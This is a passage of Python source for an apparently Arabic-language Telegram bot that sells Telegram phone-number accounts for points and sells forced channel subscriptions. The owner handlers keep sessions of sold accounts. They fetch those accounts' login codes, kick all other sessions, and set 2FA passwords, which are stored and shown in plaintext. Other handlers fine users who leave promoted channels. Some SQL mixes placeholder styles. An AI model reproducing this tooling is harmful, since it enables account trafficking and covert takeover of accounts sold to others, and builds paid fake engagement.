        await q.edit_message_text(info, parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(action_btns))
        return

    # ── جلب آخر كود للحساب المباع ──
    if data.startswith("os:sold_code:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec or not rec.get("session_string"):
            await q.edit_message_text("⚠️ لا تتوفر جلسة لهذا الرقم.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:sold_accounts")]]))
            return
        await q.edit_message_text(f"⏳ يتم جلب آخر كود لرقم {rec['phone_number']}...")
        _cli = TelegramClient(StringSession(rec["session_string"]), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        try:
            await asyncio.wait_for(_cli.connect(), timeout=15)
            if not await asyncio.wait_for(_cli.is_user_authorized(), timeout=8):
                await q.edit_message_text("❌ الجلسة منتهية — الحساب مطرود.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:sold_detail:{stock_id}")]]))
                return
            code_msg, code_date = await fetch_last_login_code(_cli)
            if code_msg:
                import datetime as _dt
                _now = _dt.datetime.now(_dt.timezone.utc)
                _msg_date = code_date
                if _msg_date and _msg_date.tzinfo is None:
                    _msg_date = _msg_date.replace(tzinfo=_dt.timezone.utc)
                _age_minutes = int((_now - _msg_date).total_seconds() // 60) if _msg_date else None
                _age_str = (
                    f"منذ {_age_minutes} دقيقة" if _age_minutes is not None and _age_minutes < 60
                    else f"منذ {_age_minutes // 60} ساعة" if _age_minutes is not None
                    else ""
                )
                _freshness = "🟢 طازج" if _age_minutes is not None and _age_minutes <= 10 else "🔴 قديم"
                txt = (
                    f"🔑 *آخر كود وصل لرقم {rec['phone_number']}:*\n\n"
                    f"{code_msg}\n\n"
                    f"🕐 وصل {_age_str} — {_freshness}"
                )
            else:
                txt = f"ℹ️ لا يوجد كود حديث لرقم {rec['phone_number']}."
            await q.edit_message_text(txt, parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 تحديث", callback_data=f"os:sold_code:{stock_id}")],
                    [InlineKeyboardButton("🔙 رجوع للتفاصيل", callback_data=f"os:sold_detail:{stock_id}")],
                ]))
        except Exception as _e:
            await q.edit_message_text(f"❌ خطأ: {str(_e)[:120]}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:sold_detail:{stock_id}")]]))
        finally:
            try: await _cli.disconnect()
            except Exception: pass
        return

    # ── طرد جميع الجلسات الأخرى من الحساب المباع ──
    if data.startswith("os:sold_kick:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec or not rec.get("session_string"):
            await q.edit_message_text("⚠️ لا تتوفر جلسة لهذا الرقم.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:sold_accounts")]]))
            return
        await q.edit_message_text(f"⏳ يتم طرد جميع الجلسات الأخرى من {rec['phone_number']}...")
        _cli = TelegramClient(StringSession(rec["session_string"]), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        try:
            await asyncio.wait_for(_cli.connect(), timeout=15)
            if not await asyncio.wait_for(_cli.is_user_authorized(), timeout=8):
                await q.edit_message_text("❌ الجلسة منتهية — الحساب مطرود.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:sold_detail:{stock_id}")]]))
                return
            await asyncio.wait_for(_cli(ResetAuthorizationsRequest()), timeout=20)
            with db_conn() as _kc:
                _kc.execute("UPDATE number_stock SET sessions_reset=TRUE WHERE id=%s", (stock_id,))
            await q.edit_message_text(
                f"✅ *تم طرد جميع الجلسات الأخرى بنجاح!*\n\n"
                f"📱 {rec['phone_number']}\n\n"
                "الآن البوت فقط هو المتصل بهذا الحساب.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للتفاصيل", callback_data=f"os:sold_detail:{stock_id}")]]))
        except asyncio.TimeoutError:
            await q.edit_message_text("⚠️ انتهت مهلة الاتصال. حاول مجدداً.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:sold_detail:{stock_id}")]]))
        except Exception as _e:
            await q.edit_message_text(f"❌ خطأ: {str(_e)[:150]}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:sold_detail:{stock_id}")]]))
        finally:
            try: await _cli.disconnect()
            except Exception: pass
        return

    # ── عرض/تغيير 2FA للحساب المباع ──
    if data.startswith("os:sold_2fa:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec:
            await q.edit_message_text("⚠️ الرقم غير موجود.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:sold_accounts")]]))
            return
        saved_pwd = rec.get("twofa_password") or ""
        if saved_pwd:
            await q.edit_message_text(
                f"🔐 *التحقق بخطوتين — {rec['phone_number']}*\n\n"
                f"✅ مفعّل\n🗝 كلمة المرور: `{saved_pwd}`",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 توليد كلمة مرور جديدة", callback_data=f"os:sold_2fa_reset:{stock_id}")],
                    [InlineKeyboardButton("🔙 رجوع للتفاصيل", callback_data=f"os:sold_detail:{stock_id}")],
                ]))
        else:
            await q.edit_message_text(
                f"🔐 *التحقق بخطوتين — {rec['phone_number']}*\n\n"
                "❌ غير مفعّل أو كلمة المرور غير محفوظة.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔐 تفعيل التحقق بخطوتين", callback_data=f"os:sold_2fa_reset:{stock_id}")],
                    [InlineKeyboardButton("🔙 رجوع للتفاصيل", callback_data=f"os:sold_detail:{stock_id}")],
                ]))
        return

    # ── إعادة تفعيل/تغيير 2FA للحساب المباع ──
    if data.startswith("os:sold_2fa_reset:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec or not rec.get("session_string"):
            await q.edit_message_text("⚠️ لا تتوفر جلسة لهذا الرقم.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:sold_detail:{stock_id}")]]))
            return
        current_pwd = rec.get("twofa_password") or ""
        await q.edit_message_text(
            f"⏳ جاري {'تغيير' if current_pwd else 'تفعيل'} التحقق بخطوتين لرقم {rec['phone_number']}...")
        if current_pwd:
            _cli2 = TelegramClient(
                StringSession(rec["session_string"]), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
            try:
                await _cli2.connect()
                new_pwd = generate_2fa_password()
                _expected_2fa_change[rec["phone_number"]] = time.time()
                await _cli2.edit_2fa(current_password=current_pwd, new_password=new_pwd, hint="Auto")
                with db_conn() as _c2:
                    _c2.execute("UPDATE number_stock SET twofa_password=%s WHERE id=%s", (new_pwd, stock_id))
                await q.edit_message_text(
                    f"✅ *تم تغيير كلمة مرور 2FA بنجاح!*\n\n"
                    f"📱 {rec['phone_number']}\n🗝 الجديدة: `{new_pwd}`",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للتفاصيل", callback_data=f"os:sold_detail:{stock_id}")]]))
            except Exception as _e2:
                await q.edit_message_text(f"❌ فشل تغيير كلمة المرور: {str(_e2)[:150]}",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:sold_2fa:{stock_id}")]]))
            finally:
                try: await _cli2.disconnect()
                except Exception: pass
        else:
            _ok, _msg, _pwd = await enable_2fa_for_number(
                rec["phone_number"], rec["session_string"], stock_id, bot=context.bot)
            if _ok and _pwd:
                await q.edit_message_text(
                    f"✅ *تم تفعيل 2FA بنجاح!*\n\n"
                    f"📱 {rec['phone_number']}\n🗝 كلمة المرور: `{_pwd}`",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للتفاصيل", callback_data=f"os:sold_detail:{stock_id}")]]))
            else:
                await q.edit_message_text(f"❌ فشل تفعيل 2FA: {_msg}",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:sold_detail:{stock_id}")]]))
        return

    # ── تسجيل خروج البوت من الحساب المباع (مع تأكيد) ──
    if data.startswith("os:sold_logout:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec or not rec.get("session_string"):
            await q.edit_message_text("⚠️ لا تتوفر جلسة لهذا الرقم.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:sold_accounts")]]))
            return
        await q.edit_message_text(
            f"🚪 *تسجيل خروج البوت من:* `{rec['phone_number']}`\n\n"
            "⚠️ هذا سيُلغي جلسة البوت على هذا الحساب المباع نهائياً.\n"
            "لن تتمكن من إجراء أي عملية عليه لاحقاً حتى تُضاف جلسة جديدة.\n\n"
            "هل أنت متأكد؟",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ نعم، سجّل خروج", callback_data=f"os:sold_logout_confirm:{stock_id}")],
                [InlineKeyboardButton("🔙 إلغاء", callback_data=f"os:sold_detail:{stock_id}")],
            ]))
        return

    if data.startswith("os:sold_logout_confirm:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec or not rec.get("session_string"):
            await q.edit_message_text("⚠️ لا تتوفر جلسة.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:sold_accounts")]]))
            return
        phone = rec["phone_number"]
        await q.edit_message_text(f"⏳ يتم تسجيل الخروج من {phone}...")
        try:
            await _stop_number_monitor(phone)
        except Exception:
            pass
        _lo_ok = False
        _lo_note = ""
        _loc = TelegramClient(StringSession(rec["session_string"]), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        try:
            await asyncio.wait_for(_loc.connect(), timeout=15)
            if await asyncio.wait_for(_loc.is_user_authorized(), timeout=8):
                await _loc.log_out()
                _lo_ok   = True
                _lo_note = "تم تسجيل الخروج وإلغاء الجلسة بنجاح."
            else:
                _lo_ok   = True
                _lo_note = "الجلسة كانت منتهية مسبقاً."
        except asyncio.TimeoutError:
            _lo_note = "⚠️ انتهت مهلة الاتصال — تم مسح الجلسة محلياً فقط."
        except Exception as _le:
            _lo_note = f"⚠️ {str(_le)[:120]}"
        finally:
            try: await _loc.disconnect()
            except Exception: pass
        with db_conn() as _lc2:
            _lc2.execute(
                "UPDATE number_stock SET session_string=NULL, sessions_reset=FALSE, "
                "force_listed=FALSE, auto_2fa_enabled=FALSE WHERE id=%s",
                (stock_id,)
            )
        await q.edit_message_text(
            f"🚪 *تسجيل خروج — {phone}*\n\n"
            f"{'✅' if _lo_ok else '⚠️'} {_lo_note}\n\n"
            "📌 الجلسة مُحذوفة من قاعدة البيانات.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للمبيوعات", callback_data="os:sold_accounts")]]))
        return

    if data == "os:failed_deliveries" and is_own:
        def _fmt_dt(v):
            if v is None: return "—"
            if hasattr(v, "strftime"): return v.strftime("%Y-%m-%d %H:%M")
            return str(v)[:16]

        with db_conn() as c:
            # طلبات معلقة على أرقام تيلغرام تجاوزت ساعتين — المظلومون الحقيقيون
            old_pending = c.execute(
                "SELECT pe.id, pe.user_id, pe.prize_type, pe.prize_value, pe.points_cost, "
                "       pe.order_code, pe.created_at, pe.compensated_at, pe.compensated_pts, "
                "       pe.compensated_reason, u.full_name "
                "FROM prize_exchanges pe "
                "LEFT JOIN users u ON u.user_id = pe.user_id "
                "WHERE pe.status = 'pending' "
                "  AND pe.prize_type IN ('telegram_number','telegram_number_code') "
                "  AND pe.points_cost > 0 "
                "  AND pe.created_at < NOW() - INTERVAL '2 hours' "
                "ORDER BY pe.created_at ASC LIMIT 30"
            ).fetchall()

            # عمليات عُوِّضت مسبقاً (للمعلومية فقط)
            already_compensated = c.execute(
                "SELECT pe.id, pe.user_id, pe.prize_value, pe.points_cost, "
                "       pe.compensated_at, pe.compensated_pts, pe.compensated_reason, u.full_name "
                "FROM prize_exchanges pe "
                "LEFT JOIN users u ON u.user_id = pe.user_id "
                "WHERE pe.compensated_at IS NOT NULL "
                "  AND pe.prize_type IN ('telegram_number','telegram_number_code') "
                "ORDER BY pe.compensated_at DESC LIMIT 10"
            ).fetchall()

        # فصل المظلومين الحقيقيين (لم يُعوَّضوا) عمّن عُوِّضوا مسبقاً
        needs_comp  = [r for r in old_pending if not r["compensated_at"]]
        done_comp   = [r for r in old_pending if r["compensated_at"]]

        lines = ["⚠️ <b>تعويض المظلومين</b>\n"]

        # ── المظلومون الذين لم يُعوَّضوا بعد ──
        if needs_comp:
            lines.append(f"🔴 <b>ينتظرون التعويض ({len(needs_comp)}):</b>")
            for r in needs_comp:
                uid  = r["user_id"]
                name = r["full_name"] or f"ID:{uid}"
                pts  = r["points_cost"] or 0
                lines.append(
                    f"📌 <code>{r['order_code'] or r['id']}</code>\n"
                    f"   👤 <a href='tg://user?id={uid}'>{name}</a>\n"
                    f"   💰 يستحق: {pts:,} نقطة\n"
                    f"   📅 {_fmt_dt(r['created_at'])}"
                )
        else:
            lines.append("🔴 <b>ينتظرون التعويض:</b> لا يوجد ✅")

        lines.append("")

        # ── عُوِّضوا مسبقاً من القائمة الحالية ──
        if done_comp:
            lines.append(f"✅ <b>عُوِّضوا مسبقاً من هذه القائمة ({len(done_comp)}):</b>")
            for r in done_comp:
                uid  = r["user_id"]
                name = r["full_name"] or f"ID:{uid}"
                comp_ts = _fmt_dt(r["compensated_at"])
                lines.append(
                    f"   👤 <a href='tg://user?id={uid}'>{name}</a> — "
                    f"{r['compensated_pts'] or 0:,} نقطة — {comp_ts}"
                )

        lines.append("")

        # ── سجل آخر 10 تعويضات ──
        if already_compensated:
            lines.append(f"📋 <b>آخر التعويضات المنفّذة ({len(already_compensated)}):</b>")
            for r in already_compensated:
                uid  = r["user_id"]
                name = r["full_name"] or f"ID:{uid}"
                comp_ts = _fmt_dt(r["compensated_at"])
                reason_map = {
                    "owner_manual":           "يدوي بالمالك",
                    "auto_duplicate":         "تلقائي (بيع مكرر)",
                    "manual_number_deleted":  "حذف رقم يدوي",
                    "auto_bulk":              "تلقائي جماعي",
                }
                reason_label = reason_map.get(r["compensated_reason"] or "", r["compensated_reason"] or "—")
                lines.append(
                    f"   ✅ <a href='tg://user?id={uid}'>{name}</a> — "
                    f"{r['compensated_pts'] or 0:,} نقطة — {reason_label} — {comp_ts}"
                )

        text = "\n".join(lines)
        if len(text) > 4000:
            text = text[:3950] + "\n\n<i>(قُطع لطول القائمة)</i>"

        action_rows = []
        # زر التعويض التلقائي الجماعي — يظهر فقط إذا كان هناك من يحتاج تعويضاً
        if needs_comp:
            total_pts = sum(r["points_cost"] or 0 for r in needs_comp)
            action_rows.append([InlineKeyboardButton(
                f"🤖 تعويض {len(needs_comp)} مظلوم تلقائياً ({total_pts:,} نقطة)",
                callback_data="admin:auto_compensate_all"
            )])
        # أزرار فردية لأول 5 حالات فقط
        for r in needs_comp[:5]:
            uid  = r["user_id"]
            pe_id = r["id"]
            pts  = r["points_cost"] or 0
            name = (r["full_name"] or f"ID:{uid}")[:20]
            action_rows.append([InlineKeyboardButton(
                f"↩️ {pts:,} نقطة → {name}",
                callback_data=f"admin:refund_pe:{pe_id}"
            )])
        action_rows.append([InlineKeyboardButton("🔄 تحديث", callback_data="os:failed_deliveries")])
        action_rows.append([InlineKeyboardButton("🔙 رجوع للمخزون", callback_data="os:manage_numbers")])

        await q.edit_message_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(action_rows)
        )
        return

    # ── تعويض جماعي تلقائي لجميع المظلومين ──
    if data == "admin:auto_compensate_all" and is_own:
        with db_conn() as c:
            pending_cases = c.execute(
                "SELECT id, user_id, points_cost, order_code "
                "FROM prize_exchanges "
                "WHERE status = 'pending' "
                "  AND prize_type IN ('telegram_number','telegram_number_code') "
                "  AND points_cost > 0 "
                "  AND compensated_at IS NULL "
                "  AND created_at < NOW() - INTERVAL '2 hours'"
            ).fetchall()

        if not pending_cases:
            await q.answer("✅ لا يوجد أحد يحتاج تعويضاً الآن.", show_alert=True)
            return

        compensated = 0
        skipped     = 0
        total_pts   = 0

        for pe in pending_cases:
            pe_id = pe["id"]
            uid   = pe["user_id"]
            pts   = int(pe["points_cost"] or 0)
            if pts <= 0:
                skipped += 1
                continue
            # تسجيل ذري — إذا سُبقنا نتخطى
            with db_conn() as c:
                c.execute(
                    "UPDATE prize_exchanges SET status='refunded_by_owner', "
                    "compensated_at=NOW(), compensated_pts=%s, compensated_reason='auto_bulk' "
                    "WHERE id=%s AND compensated_at IS NULL AND status='pending'",
                    (pts, pe_id)
                )
                updated = c.rowcount
            if updated == 0:
                skipped += 1
                continue
            add_points(uid, pts)
            compensated += 1
            total_pts   += pts
            # إشعار المستخدم
            try:
                await context.bot.send_message(
                    uid,
                    f"✅ *تعويض تلقائي*\n\n"
                    f"اكتشف النظام أن عمليتك `{pe['order_code'] or pe_id}` لم تكتمل.\n"
                    f"💰 تم إعادة *{pts:,} نقطة* لرصيدك تلقائياً.\n\n"
                    f"نعتذر عن الإزعاج 🙏",
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass

        await q.edit_message_text(
            f"✅ <b>تم تعويض المظلومين</b>\n\n"
            f"👤 عدد المعوَّضين: <b>{compensated}</b>\n"
            f"💰 إجمالي النقاط الموزَّعة: <b>{total_pts:,}</b>\n"
            f"⏭ متخطَّى (عُوِّضوا مسبقاً): {skipped}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 مراجعة القائمة", callback_data="os:failed_deliveries")],
                [InlineKeyboardButton("🔙 رجوع للمخزون", callback_data="os:manage_numbers")],
            ])
        )
        return

    # ── معالجة إعادة النقاط لطلب فاشل ──
    if data.startswith("admin:refund_pe:") and is_own:
        pe_id = int(data.split(":")[-1])
        with db_conn() as c:
            pe = c.execute(
                "SELECT id, user_id, points_cost, status, order_code, "
                "       compensated_at, compensated_pts, compensated_reason "
                "FROM prize_exchanges WHERE id=%s", (pe_id,)
            ).fetchone()
        if not pe:
            await q.answer("⚠️ العملية غير موجودة.", show_alert=True)
            return
        # ─── حماية من التعويض المزدوج ───
        if pe["compensated_at"]:
            _comp_ts = pe["compensated_at"]
            _comp_ts_str = _comp_ts.strftime("%Y-%m-%d %H:%M") if hasattr(_comp_ts, "strftime") else str(_comp_ts)[:16]
            await q.answer(
                f"✅ هذا العضو عُوِّض مسبقاً بـ {pe['compensated_pts'] or 0:,} نقطة\n"
                f"بتاريخ {_comp_ts_str}\n"
                f"السبب: {pe['compensated_reason'] or '—'}\n\n"
                f"لا يحتاج تعويضاً إضافياً.",
                show_alert=True
            )
            return
        if pe["status"] not in ("pending", "failed"):
            await q.answer(f"⚠️ حالة العملية: {pe['status']} — لا يمكن استرداد نقاطها.", show_alert=True)
            return
        pts = int(pe["points_cost"] or 0)
        uid = pe["user_id"]
        # تسجيل التعويض وتحديث الحالة في نفس الوقت
        with db_conn() as c:
            c.execute(
                "UPDATE prize_exchanges SET status='refunded_by_owner', "
                "compensated_at=NOW(), compensated_pts=%s, compensated_reason='owner_manual' "
                "WHERE id=%s AND compensated_at IS NULL",
                (pts, pe_id)
            )
            rows_updated = c.rowcount
        if rows_updated == 0:
            # سباق: تعويض آخر سبقنا
            await q.answer("⚠️ تم تعويض هذه العملية للتو من مكان آخر. لا داعي للتكرار.", show_alert=True)
            return
        if pts > 0:
            add_points(uid, pts)
        try:
            await context.bot.send_message(
                uid,
                f"✅ *إعادة نقاط*\n\nأعاد المالك نقاطك لعملية `{pe['order_code'] or pe_id}`.\n"
                f"💰 أُعيد إليك: *{pts:,} نقطة*.\n\nنعتذر عن الإزعاج 🙏",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception:
            pass
        await q.answer(f"✅ تمت إعادة {pts:,} نقطة للمستخدم {uid}.", show_alert=True)
        return

# ────────────────────────────────────────────────────────────
#  Telegram Stars — Pre-Checkout
# ────────────────────────────────────────────────────────────
async def pre_checkout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query   = update.pre_checkout_query
    payload = query.invoice_payload

    try:
        valid = False
        if payload.startswith("charge_stars:"):
            parts = payload.split(":")
            if len(parts) == 3 and parts[1].isdigit() and parts[2].isdigit():
                expected_stars = int(parts[1])
                uid_in_payload = int(parts[2])
                actual_stars   = query.total_amount
                if query.from_user.id == uid_in_payload and actual_stars == expected_stars:
                    valid = True

        # ─── الاشتراك الإجباري بالنجوم ───
        # payload: fund_mandatory:{user_id}:{member_count}:{channel}:{stars}
        if payload.startswith("fund_mandatory:"):
            parts = payload.split(":")
            if len(parts) == 5 and parts[1].isdigit() and parts[4].isdigit():
                uid_in_payload = int(parts[1])
                expected_stars = int(parts[4])
                if query.from_user.id == uid_in_payload and query.total_amount == expected_stars:
                    valid = True

        if valid:
            await query.answer(ok=True)
        else:
            await query.answer(ok=False, error_message="حدث خطأ في التحقق من الدفع.")
    except Exception as _pce:
        logger.error(f"❌ خطأ في pre_checkout: {_pce}")
        try:
            await query.answer(ok=False, error_message="خطأ داخلي، حاول مجدداً.")
        except Exception:
            pass

# ────────────────────────────────────────────────────────────
#  Telegram Stars — Successful Payment
# ────────────────────────────────────────────────────────────
async def successful_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    payment = update.message.successful_payment
    payload = payment.invoice_payload
    user    = update.effective_user
    is_own  = (user.id == OWNER_ID)

    if payload.startswith("charge_stars:"):
        parts = payload.split(":")
        stars = int(parts[1])
        rate  = int(get_setting("star_to_points") or "250")
        pts   = stars * rate
        add_points(user.id, pts)
        with db_conn() as c:
            c.execute(
                "INSERT INTO star_transactions (user_id,stars,points_given,telegram_payment_id) VALUES (?,?,?,?)",
                (user.id, stars, pts, payment.telegram_payment_charge_id)
            )
        db_user = get_user(user.id)
        await update.message.reply_text(
            f"✅ *تم الشحن بنجاح!*\n\n"
            f"⭐ النجوم: {stars}\n"
            f"✨ النقاط المضافة: {pts}\n"
            f"💰 رصيدك الآن: {db_user['points']} نقطة",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=main_menu_kb(is_own)
        )
        # لا يُرسَل إشعار بهذا لكروب الإشعارات — مخصص الآن للطلبات فقط.

    # ─── تمويل الاشتراك الإجباري بالنجوم ───
    # payload: fund_mandatory:{user_id}:{member_count}:{channel}:{stars}
    elif payload.startswith("fund_mandatory:"):
        parts        = payload.split(":")
        _uid         = int(parts[1])
        member_count = int(parts[2])
        channel      = parts[3]
        total_stars  = int(parts[4])
        channel_md   = md_escape(channel)

        # التحقق من الحد الأقصى للقنوات الإجبارية
        is_queued = False
        if count_active_mandatory_channels() >= MANDATORY_MAX_ACTIVE:
            is_queued = True

        code = next_order_code(user.id)
        with db_conn() as c:
            c.execute(
                "INSERT INTO channel_funding (user_id,channel_username,funding_type,cost_points,target_members,current_members,status) "
                "VALUES (%s,%s,'mandatory',0,%s,0,'active')",
                (user.id, channel, member_count)
            )
            c.execute(
                "INSERT INTO mandatory_channels (channel_username,owner_user_id,funding_type,active,queued) "
                "VALUES (%s,%s,'mandatory',%s,%s) "
                "ON CONFLICT (channel_username) DO UPDATE SET funding_type=EXCLUDED.funding_type, owner_user_id=EXCLUDED.owner_user_id, "
                "active=EXCLUDED.active, queued=EXCLUDED.queued",
                (channel, user.id, 0 if is_queued else 1, 1 if is_queued else 0)
            )

        if is_queued:
            await update.message.reply_text(
                f"⏳ *تم استلام تمويل قناتك بنجاح — في قائمة الانتظار!*\n\n"
                f"📢 القناة: @{channel_md}\n"
                f"👥 عدد الأعضاء: {member_count:,}\n"
                f"⭐ دفعت: {total_stars} نجمة\n\n"
                f"⚠️ عدد القنوات الإجبارية النشطة بلغ الحد الأقصى ({MANDATORY_MAX_ACTIVE}).\n"
                f"✅ ستُفعَّل قناتك تلقائياً فور تحرّر أحد الأماكن.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=main_menu_kb(is_own)
            )
        else:
            await update.message.reply_text(
                f"✅ *تم تفعيل قناتك الإجبارية بنجاح!*\n\n"
                f"📢 القناة: @{channel_md}\n"
                f"👥 عدد الأعضاء: {member_count:,}\n"
                f"⭐ دفعت: {total_stars} نجمة\n"
                f"📌 كود العملية: `{code}`",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=main_menu_kb(is_own)
            )

        _queue_note = "\n⏳ <b>ملاحظة:</b> دخلت قائمة الانتظار وستُفعَّل عند توفر مكان." if is_queued else ""
        _terms = mandatory_terms_text_html()
        try:
            await context.application.bot.send_message(
                ADMIN_GROUP_ID,
                f"📢 <b>تمويل قناة إجباري — نجوم</b>\n"
                f"👤 <a href='tg://user?id={user.id}'>{user.full_name}</a>\n"
                f"📡 القناة: @{channel}\n"
                f"👥 {member_count:,} عضو\n"
                f"⭐ {total_stars} نجمة\n"
                f"📌 {code}"
                f"{_queue_note}\n"
                f"{_terms}",
                parse_mode="HTML"
            )
        except Exception:
            pass

# ── حذف رسائل "انضم/غادر" الخدمية تلقائياً من كروب إشعارات المالك ──
# (حذف الرسالة فقط، بدون أي إجراء على الشخص نفسه — الكروب أصبح مخصصاً للطلبات فقط)
async def delete_group_service_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.effective_message
    if not msg:
        return
    try:
        await msg.delete()
    except Exception as e:
        logger.warning(f"⚠️ فشل حذف رسالة انضمام/مغادرة في كروب الإشعارات: {e}")


# ────────────────────────────────────────────────────────────
#  Main
# ────────────────────────────────────────────────────────────
# ── اكتشاف مغادرة الأعضاء لقنوات التمويل الداخلي وخصم نقاط العقوبة ──
async def handle_member_leave(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cmu = update.chat_member
    if not cmu:
        return
    old_status = cmu.old_chat_member.status
    new_status = cmu.new_chat_member.status
    member_user = cmu.new_chat_member.user
    if member_user.is_bot:
        return
    was_in = old_status in ("member", "administrator", "creator", "restricted")
    now_out = new_status in ("left", "kicked")
    if not (was_in and now_out):
        return
    username = (cmu.chat.username or "").lstrip("@")
    if not username:
        return
    with db_conn() as c:
        ch = c.execute(
            "SELECT * FROM mandatory_channels WHERE channel_username=? AND funding_type='internal' AND active=1",
            (username,)
        ).fetchone()
    if not ch:
        return
    with db_conn() as c:
        claimed = c.execute(
            "SELECT joined_at FROM channel_join_rewards WHERE user_id=? AND channel_id=?",
            (member_user.id, ch["id"])
        ).fetchone()
        if not claimed:
            return
        # ─── فحص مهلة المغادرة الآمنة (24 ساعة افتراضياً) ───
        grace_hours = int(get_setting("internal_leave_grace_hours") or "24")
        joined_at = claimed["joined_at"]
        if joined_at:
            import datetime as _dt_grace
            now_utc = _dt_grace.datetime.now(_dt_grace.timezone.utc)
            if hasattr(joined_at, "tzinfo") and joined_at.tzinfo is None:
                joined_at = joined_at.replace(tzinfo=_dt_grace.timezone.utc)
            time_passed = now_utc - joined_at
            if time_passed.total_seconds() >= grace_hours * 3600:
                # مضت المهلة — المغادرة مجانية بدون خصم
                c.execute(
                    "DELETE FROM channel_join_rewards WHERE user_id=%s AND channel_id=%s",
                    (member_user.id, ch["id"])
                )
                return
        c.execute(
            "DELETE FROM channel_join_rewards WHERE user_id=%s AND channel_id=%s",
            (member_user.id, ch["id"])
        )
    # ─── خصم النقاط — يُسمح بالرصيد السالب ───
    penalty = int(get_setting("channel_leave_penalty") or "75")
    with db_conn() as _pc:
        _pc.execute("UPDATE users SET points=points-%s WHERE user_id=%s", (penalty, member_user.id))
    db_u = get_user(member_user.id)
    balance_after = db_u["points"] if db_u else 0
    try:
        await context.bot.send_message(
            member_user.id,
            f"⚠️ *تنبيه خصم نقاط*\n\n"
            f"لاحظنا أنك غادرت القناة @{username} خلال مهلة {grace_hours} ساعة من انضمامك.\n"
            f"💸 تم خصم *{penalty} نقطة* من رصيدك.\n"
            f"💰 رصيدك الآن: *{balance_after} نقطة*\n\n"
            f"يمكنك الانضمام للقناة مجدداً من قسم 💰 تجميع النقاط لكسب النقاط من جديد.",
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception:
        pass


# ────────────────────────────────────────────────────────────
#  أوامر slash إضافية للمالك
# ────────────────────────────────────────────────────────────
async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المالك: /broadcast <رسالة> — يبث رسالة HTML لجميع المستخدمين."""
    user = update.effective_user
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ هذا الأمر للمالك فقط.")
        return
    if not context.args:
        await update.message.reply_text("الاستخدام:\n/broadcast <نص الرسالة>")
        return
    broadcast_text = " ".join(context.args)
    with db_conn() as c:
        users_list = c.execute("SELECT user_id FROM users").fetchall()
    sent, failed = 0, 0
    for u_row in users_list:
        try:
            await context.bot.send_message(u_row["user_id"], broadcast_text, parse_mode=ParseMode.HTML)
            sent += 1
        except Exception:
            failed += 1
    await update.message.reply_text(f"✅ أُرسلت: {sent} | ❌ فشل: {failed}")


async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر عام: /cancel — يوقف أي عملية إدخال نصي معلّقة (مثل حلقة إضافة أرقام متتالية) ويرجع للقائمة."""
    user = update.effective_user
